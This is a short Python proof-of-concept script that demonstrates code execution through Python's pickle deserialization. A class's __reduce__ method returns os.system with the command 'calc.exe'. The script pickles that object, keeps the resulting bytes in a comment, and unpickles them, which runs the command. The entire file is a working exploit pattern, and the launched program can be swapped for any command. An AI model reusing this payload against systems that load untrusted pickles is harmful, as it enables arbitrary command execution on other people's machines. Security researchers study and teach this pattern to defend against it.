#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os
import pickle


class Exp:
    def __reduce__(self):
        return os.system, ("calc.exe",)


poc = pickle.dumps(Exp())

# poc = b'\x80\x04\x95 \x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\x08calc.exe\x94\x85\x94R\x94.'
pickle.loads(poc)
